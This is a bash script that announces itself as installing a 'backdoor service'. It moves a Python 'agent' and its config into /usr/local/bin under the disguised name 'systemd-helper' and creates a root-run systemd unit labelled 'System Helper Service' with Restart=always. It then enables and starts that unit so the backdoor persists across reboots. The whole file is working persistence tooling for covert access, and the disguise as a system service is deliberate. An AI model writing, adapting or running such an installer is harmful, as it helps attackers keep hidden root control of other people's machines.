#!/bin/bash

# === CONFIG ===
SERVICE_NAME="systemd-helper"
AGENT_NAME="systemd-helper.py"
INSTALL_PATH="/usr/local/bin"
SERVICE_PATH="/etc/systemd/system"

echo "[+] Installing backdoor service..."

# === Move agent ===
echo "[+] Moving agent to $INSTALL_PATH..."
sudo mv ~/$AGENT_NAME $INSTALL_PATH/$SERVICE_NAME.py

# === Move config ===
if [ -f ~/config.json ]; then
    echo "[+] Moving config.json..."
    sudo mv ~/config.json $INSTALL_PATH/config.json
fi

# === Set permissions ===
echo "[+] Setting permissions..."
sudo chmod +x $INSTALL_PATH/$SERVICE_NAME.py

# === Create systemd service ===
echo "[+] Creating systemd service..."

sudo bash -c "cat > $SERVICE_PATH/$SERVICE_NAME.service" <<EOF
[Unit]
Description=System Helper Service
After=network.target

[Service]
ExecStart=/usr/bin/python $INSTALL_PATH/$SERVICE_NAME.py
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

# === Reload systemd ===
echo "[+] Reloading systemd..."
sudo systemctl daemon-reexec
sudo systemctl daemon-reload

# === Enable service ===
echo "[+] Enabling service..."
sudo systemctl enable $SERVICE_NAME.service

# === Start service ===
echo "[+] Starting service..."
sudo systemctl start $SERVICE_NAME.service

echo "[+] Installation complete!"